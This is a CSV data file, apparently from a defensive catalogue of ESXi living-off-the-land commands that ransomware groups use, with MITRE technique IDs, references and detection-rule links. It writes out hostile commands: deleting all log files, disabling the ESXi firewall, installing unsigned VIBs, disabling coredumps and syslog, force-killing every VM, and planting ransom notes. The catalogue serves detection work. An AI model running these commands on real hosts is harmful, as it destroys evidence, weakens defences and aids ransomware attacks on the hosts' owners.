"Name"Name","Description","Author","Created","Commands","Commands_Command","Commands_Description","Commands_Usecase","Commands_Category","Commands_Privileges","Commands_MitreID","Commands_OperatingSystem","Commands_Tags","Commands_Tags_E-Crime","Full_Path","Full_Path_Path","Resources","Resources_Link","Acknowledgement","Acknowledgement_Person","Acknowledgement_Handle","Commands_ProceduralExamples","Detection","Detection_Elastic","AtomicTests","Commands_ProcedureExamples","Detection_Sigma","Code_Sample","Code_Sample_Code","Commands_Tags_APT","is_legit"
"find","A commandline utility that can be used to locate files and directories based on various criteria, such as name, type, size, modification date, etc.","Janantha Marasinghe @blueteam0ps_","2024-08-27","","[''find /vmfs/volumes/ -type f -name ""*.vmdk""''-|-''/bin/find / -name *.log -exec /bin/rm -rf {} \;''-|-''find /usr/lib/vmware -type f -name index.html'']","[''Locates files with extensions commonly associated with Virtual Machines, such as .vmdk and .vmx within /vmfs/volumes folder path. This may be performed programmatically and additional switches can be used to exclude specific folders from the search.''-|-''Find and delete all files ending with .log extension''-|-''Find and replace the ESXi web console homepage.'']","[''Locate virtual machine disks in preparation for encryption operations or for exfiltration.''-|-''An adversary deletes all files ending with the .log file extension to clear evidence of their offensive operations.''-|-''An adversary finds and replaces the ESXi web console homepage with a custom version. This often contains ransomware notification message.'']","[''Find Files''-|-''Remove Evidence''-|-''Find and Replace'']","[''Administrator''-|-''User''-|-''User'']","[''T1083''-|-''T1070.004''-|-''T1491.001'']","[''ESXi''-|-''ESXi''-|-''ESXi'']","","[''RansomHouse''-|-''Nevada'']","","[''/usr/lib/vmware/busybox/bin/busybox find''-|-''/sbin/find''-|-''/bin/find'']","","[''https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire''-|-''https://www.trellix.com/en-au/blogs/research/ransomhouse-am-see/'']","","[''Jason Hill''-|-''Pham Duy Phuc''-|-''Max Kersten''-|-''Noël Keijzer''-|-''Michaël Schrijver''-|-''Germán Fernández''-|-''MalwareHunterTeam'']","[''@1ZRR4H''-|-''@malwrhunterteam'']","[''- find ""/vmfs/volumes/$volume/"" -type f -name ""*.vmdk"" -o -name ""*.vmx"" -o -name ""*.vmxf"" -o -name ""*.vmsd"" -o -name ""*.vmsn"" -o -name ""*.vswp"" -o -name ""*.vmss"" -o -name ""*.nvram"" -o -name ""*.vmem"" - find /vmfs/volumes/ -type f -not \( -path /sys -prune \) -not \( -path /proc -prune \)   -not \( -path /run -prune \) -not \( -path /var/log -prune \) -name ""*.vmdk*"" -o -name ""*.ovf*"" -o -name ""*.ova*"" -o -name ""*.vmem*"" -o -name ""*.vswp*"" -o -name ""*.vmsd*"" -o -name ""*.vmsn*"" -o -name ""*.vib*"" -o -name ""*.vbk*"" -o -name ""*.vbm*"" ''-|-''/bin/find / -name *.log -exec /bin/rm -rf {} \;''-|-''- find /usr/lib/vmware -type f -name index.html mv ""$path_to_ui/index.html"" ""$path_to_ui/index1.html cp ""$CLEAN_DIR/index.html"" ""$path_to_ui/index.html""  '']","","https://github.com/elastic/detection-rules/blob/main/rules/linux/defense_evasion_rename_esxi_index_file.toml","https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1083/T1083.md#atomic-test-7---esxi---enumerate-vmdks-available-on-an-esxi-host","","","","None","","false"
"esxcli","esxcli is a command-line interface (CLI) tool (which is a python script) used to manage VMware ESXi hosts. Using esxcli, administrators can perform various tasks related to ESXi host management, including network configuration, storage management, and VM operations.","Janantha Marasinghe @blueteam0ps_","2024-08-27","","[''esxcli --formatter=csv --format-param=fields==""WorldID,DisplayName"" vm process list''-|-''esxcli vm process kill --type=force --world-id=796791''-|-''esxcli system version get''-|-''esxcli system hostname get''-|-''esxcli system account list''-|-''esxcli storage filesystem list''-|-''/bin/sh -c ""esxcli system welcomemsg set -m=""""''-|-''esxcli network firewall set --enabled false''-|-''esxcli network firewall set --default-action true''-|-''esxcli vsan debug vmdk list''-|-''esxcli --format-param=fields==""Type,ObjectUUID,Configuration"" vsan debug object list''-|-''esxcli --formatter=csv --format-param=fields==""Device,DevfsPath"" storage core device list''-|-''esxcli --formatter=csv network ip interface ipv4 get''-|-''esxcli software vib install -f --no-sig-check''-|-''esxcli software acceptance set --level CommunitySupported''-|-''esxcli system syslog config set --logdir=/tmp''-|-''esxcli system coredump file set --unconfigure'']","[''Provides a CSV output of running Virtual Machines with its corresponding WorldID and DisplayName.''-|-''Terminates a Virtual Machine using its World ID.''-|-''Display the product name, version and build information.''-|-''Shows FQDN of the ESXi host.''-|-''Displays a list of local accounts in the ESXi host.''-|-''Shows all the volumes available on the ESXi host.''-|-''Changes the ESXi Welcome Message on the Direct Console User Interface (DCUI).''-|-''Disables the ESXi firewall.''-|-''Changes the ESXi firewall default action to PASS. Command is inferred based on vendor documentation, not available via CTI.''-|-''List the status of VMDKs in vSAN.''-|-''List the UUID of the vSAN objects.''-|-''List the Devfs Path of the devices currently registered with the storage.''-|-''Displays network interface details.''-|-''Install a VIB without checking the signature.''-|-''Changes the VIB acceptance level to CommunitySupported.''-|-''Changes the syslog directory using esxcli. This is followed by the command esxcli system syslog reload''-|-''Disable creation of coredumps in ESXi'']","[''Provides a list of running Virtual Machines with their WorldID and Displayname in CSV format''-|-''Force terminates a VM using the WorldID when Soft or Hard terminates options fail. Soft termination allows the guest OS to gracefully shut down.This is similar to kill-SIGTERM. Gard mode immediately terminates a Virtual Machine using its World ID. It kills the VMX process and is similar to a kill -9 command''-|-''An adversary may use this to obtain the exact build version information of the ESXi host to facilitate subsequent actions.''-|-''FQDN of the host can be used as part of infrastructure information gathering operations.''-|-''An adversary may use the list of local accounts and use them for subsequent opeations. CSV output option was selected in certain operations.''-|-''An adversary may use this command to gain visibility of different volumes attached to the ESXi host. An adversary may use this command to gain visibility of different volumes attached to the ESXi host within /vmfs/volumes folder. This location usually holds data related to VMs.''-|-''An adversary changes the welcome message on the DCUI with ransomware notification.''-|-''An adversary changes the ESXi host based firewall so it will cause minimum interference with their operations.''-|-''An adversary sets the default firewall action to allow all incoming and outgoing traffic.''-|-''An adversary carries out enumeration of storage.''-|-''An adversary carries out enumeration of storage objects.''-|-''An adversary carries out enumeration of devices connected to storage.''-|-''An adversary may obtain information regarding network interfaces available in the ESXi host.''-|-''To bypass additional validation when installing malicious VIBs, an adversary uses the force and no signature checking switches. Malicious VIBs are used to maintain persistent and command execution capability with an ESXi host and its guest VMs.''-|-''ESXi by default will require it to be signed and by default set to PartnerSupported level. An adversary may change the VIB acceptance level to CommunitySupported level prior to running VIB installation.''-|-''An adversary may change the default directory where syslog log files are written to evade detection.''-|-''An adversary may disable coredump creation to prevent diagnostic data from being generated. This is to prevent traces of their activity from being available for inspection during investigations.'']","[''Lists VMs''-|-''terminate vm''-|-''system information''-|-''system information''-|-''account enumeration''-|-''discover storage''-|-''change display information''-|-''disable service''-|-''modify service''-|-''discover storage''-|-''discover storage''-|-''discover storage''-|-''discover network info''-|-''software operation''-|-''software operation''-|-''modify logging''-|-''modify service'']","[''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator''-|-''Administrator'']","[''T1082''-|-''T1489''-|-''T1082''-|-''T1082''-|-''T1087.001''-|-''T1082''-|-''T1491.001''-|-''T1562.004''-|-''T1562.004''-|-''None''-|-''None''-|-''None''-|-''None''-|-''None''-|-''None''-|-''T1562.012''-|-''T1562.001'']","[''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi''-|-''ESXi'']","","[''PINCHY SPIDER''-|-''REvix''-|-''Rhysida''-|-''VIKING SPIDER''-|-''Ragnar Locker''-|-''RansomHouse''-|-''Darkside''-|-''Qilin''-|-''Blacksuit''-|-''ESXiArgs''-|-''Nevada''-|-''Blackcat''-|-''Royal Ransomware''-|-''Lockbit''-|-''Revil''-|-''Howling Scorpius''-|-''Helldown'']","","[''/bin/esxcli''-|-''/sbin/esxcli'']","","[''https://www.crowdstrike.com/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/''-|-''https://www.trendmicro.com/en_us/research/22/a/analysis-and-Impact-of-lockbit-ransomwares-first-linux-and-vmware-esxi-variant.html''-|-''https://www.fortinet.com/blog/threat-research/royal-ransomware-targets-linux-esxi-servers''-|-''https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware''-|-''https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire''-|-''https://cloudsek.com/blog/analysis-of-files-used-in-esxiargs-ransomware-attack-against-vmware-esxi-servers''-|-''https://gist.githubusercontent.com/manualbashing/4955642aa81d74c3c5221a698abfe381/raw/2e7ad84449c875821b31455ae1f4193bfde8b05f/freqStunnedVMs.sh''-|-''https://www.trendmicro.com/vinfo/au/threat-encyclopedia/malware/ransom.linux.blacksuit.theodbc''-|-''https://vdc-repo.vmware.com/vmwb-repository/dcr-public/24be7af7-d9cd-48d9-bab8-8c91614be19d/0ca33108-8017-4b40-86b9-f066456894ea/doc/GUID-53C7D50E-1C8D-486D-89FF-E69B0A77E406.html''-|-''https://www.bleepingcomputer.com/news/security/linux-version-of-qilin-ransomware-focuses-on-vmware-esxi/''-|-''https://www.trellix.com/en-au/blogs/research/ransomhouse-am-see/''-|-''https://www.trendmicro.com/en_us/research/21/e/darkside-linux-vms-targeted.html''-|-''https://x.com/malwrhunterteam/status/1704974867542532286/photo/3''-|-''https://cloud.google.com/blog/topics/threat-intelligence/vmware-esxi-zero-day-bypass''-|-''https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-malware-persistence''-|-''https://blogs.vmware.com/vsphere/2011/09/whats-in-a-vib.html''-|-''https://www.hybrid-analysis.com/sample/be5d2e94c2498ec052fb025e3348085e418c856dd43080501acfe2067ba54c41/6553b8f44c06e50d5408581f''-|-''https://www.forescout.com/resources/rise-in-linux-ransomware/''-|-''https://www.reversinglabs.com/blog/gwisinlocker-ransomware-targets-south-korean-industrial-and-pharmaceutical-companies''-|-''https://developer.broadcom.com/xapis/esxcli-command-reference/7.0.0/''-|-''https://cloud.google.com/blog/topics/threat-intelligence/vmware-detection-containment-hardening''-|-''https://unit42.paloaltonetworks.com/threat-assessment-howling-scorpius-akira-ransomware/''-|-''https://labs.yarix.com/2025/01/zyxel-vulnerability-exploited-by-helldown-ransomware-group/'']","","[''Michael Dawson''-|-''Junestherry Dela Cruz''-|-''Geri Revay''-|-''Tom Fakterman''-|-''Ohav Peri''-|-''Jason Hill''-|-''Mehardeep Singh Sawhney''-|-''Lawrence Abrams''-|-''MalwareHunterTeam''-|-''MalwareHunterTeam''-|-''Pham Duy Phuc''-|-''Max Kersten''-|-''Noël Keijzer''-|-''Michaël Schrijver''-|-''Germán Fernández''-|-''Mina Naiim''-|-''Cj Arsley Mateo''-|-''Darrel Tristan Virtusio''-|-''Sarah Pearl Camiling''-|-''Andrei Alimboyao''-|-''Nathaniel Morales''-|-''Jacob Santos''-|-''Earl John Bareng''-|-''Alexander Marvi''-|-''Brad Slaybaugh''-|-''Ron Craft''-|-''Rufus Brown''-|-''Alexander Marvi''-|-''Jeremy Koppen''-|-''Tufail Ahmed''-|-''Jonathan Lepore''-|-''Joseph Edwards''-|-''Yoav Zemah''-|-''Claudio Vozza'']","[''@malwarehunterteam''-|-''@1ZRR4H'']","[''esxcli --formatter=csv vm process list''-|-''/bin/sh -c esxcli vm process list > list''-|-''esxcli vm process list''-|-''esxcli vm process kill –type=hard –world-id=<ID>''-|-''esxcli vm process kill -w <WID> -t soft''-|-''esxcli --formatter=csv --format-param=fields==""WorldID,DisplayName"" vm process list | awk -F ""\""*,\""*"" '{system(""esxcli vm process kill --type=force --world-id="" $1)}'''-|-''For i in ‘esxcli VM Process List | grep “World ID” | awk ‘{print $3}”; do esxcli vm process kill -t=force -w=$i;done;''-|-''esxcli --formatter=csv system account list''-|-''esxcli storage filesystem list | grep ""/vmfs/volumes/"" | awk -F'  ' '{print $2}'''-|-''esxcli network firewall set -d true''-|-''esxcli --formatter=csv network ip interface ipv4 get''-|-''/bin/sh -c 'esxcli system syslog config set --logdir=/tmp'''-|-''/bin/sh -c 'esxcli system coredump file set --unconfigure''']","","https://github.com/elastic/detection-rules/blob/main/rules/linux/impact_esxi_process_kill.toml","[''https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md#atomic-test-31---esxi---vm-discovery-using-esxcli''-|-''https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md#atomic-test-32---esxi---darkside-system-information-discovery''-|-''https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1129/T1129.md#atomic-test-1---esxi---install-a-custom-vib-on-an-esxi-host''-|-''https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1529/T1529.md#atomic-test-14---esxi---avoslocker-enumerates-vms-and-forcefully-kills-vms''-|-''https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.010/T1562.010.md#atomic-test-2---esxi---change-vib-acceptance-level-to-communitysupported-via-esxcli''-|-''https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.010/T1562.010.md#atomic-test-1---esxi---change-vib-acceptance-level-to-communitysupported-via-powercli'']","","[''https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_esxcli_system_discovery.yml''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_esxcli_vm_kill.yml''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_esxcli_vsan_discovery.yml''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_esxcli_vm_discovery.yml''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_esxcli_storage_discovery.yml''-|-''https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_esxcli_network_discovery.yml'']","","","UNC3886","false"
"esxcfg-advcfg","A command-line utility available in VMware ESXi to manage advanced configuration settings. It allows administrators to query, modify, and manage various advanced parameters that are not typically available through the standard vSphere Client or the ESXi host client interface.","Janantha Marasinghe @blueteam0ps_","2024-08-31","","[''esxcfg-advcfg -s 32768 /BufferCache/MaxCapacity''-|-''esxcfg-advcfg -s 20000 /BufferCache/FlushInterval'']","[''Increases the number of buffers to increase VM performance over network.''-|-''Reduces the Buffer Cache Flush interval to increase VM performance over network.'']","[''An adversary may adjust the maximum capacity of buffer cache to increase performance of operations conducted over the network.''-|-''An adversary may adjust flush interval of buffer cache to increase performance of operations conducted over the network.'']","[''Adjust Performance''-|-''Adjust Performance'']","[''Administrator''-|-''Administrator'']","","[''ESXi < 8.0''-|-''ESXi < 8.0'']","","[''Qilin''-|-''Qilin'']","","[''/bin/esxcfg-advcfg''-|-''/sbin/esxcfg-advcfg'']","","[''https://www.bleepingcomputer.com/news/security/linux-version-of-qilin-ransomware-focuses-on-vmware-esxi/''-|-''https://knowledge.broadcom.com/external/article?legacyId=2052302'']","","[''Lawrence Abrams''-|-''MalwareHunterTeam'']","@malwarehunterteam","","","","","","","","","","false"
"df","Provides disk utilisation statistics of attached volumes.","Janantha Marasinghe @blueteam0ps_","2024-08-31","","df -h -P -x""squashfs"" | awk '{print $1""\t""$2""\t""$3""\t""$4""\t""$5""\t""$6}'","Displays information regarding available storage on a ESXi host","An adversary may obtain information about existing storage availability to plan subsequent operations. Above command provides outputs available disk space in human readable format in POSIX format. It excludes the squashfs and then prints the first 6 columns from the output. Note that the -P and -x switches are not available in ESXi so the exact command may not get executed successfully.","System Information","Administrator","T1082","ESXi","","RansomHouse","","[''/bin/df''-|-''/sbin/df'']","","https://www.trellix.com/en-au/blogs/research/ransomhouse-am-see/","","[''Pham Duy Phuc''-|-''Max Kersten''-|-''Noël Keijzer''-|-''Michaël Schrijver''-|-''Germán Fernández''-|-''MalwareHunterTeam'']","[''@1ZRR4H''-|-''@malwrhunterteam'']","","","","","","","","","","false"
"chmod","An inbuilt utility that allows user's to change file and folder permissions.","Janantha Marasinghe @blueteam0ps_","2024-08-27","","/bin/chmod +w /var/spool/cron/crontabs/root","Making a file writeable.","An adversary alters a file's permissions to allow write access. Once the file has been modified, they may revert it to more restrictive permissions to prevent it being edited by other users.","Change File Permission","User","T1222.002","ESXi","","Nevada","","[''/bin/chmod''-|-''/sbin/chmod'']","","[''https://www.crowdstrike.com/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/''-|-''https://www.reddit.com/r/esxi/comments/10txpje/i_was_attack_by_esxi_ransomware_and_the_attack/''-|-''https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire''-|-''https://www.hybrid-analysis.com/sample/be5d2e94c2498ec052fb025e3348085e418c856dd43080501acfe2067ba54c41/6553b8f44c06e50d5408581f'']","","Michael Dawson","","[''/bin/chmod -w /var/spool/cron/crontabs/root''-|-''chmod +x $CLEAN_DIR/encrypt'']","","","","","","","","","false"
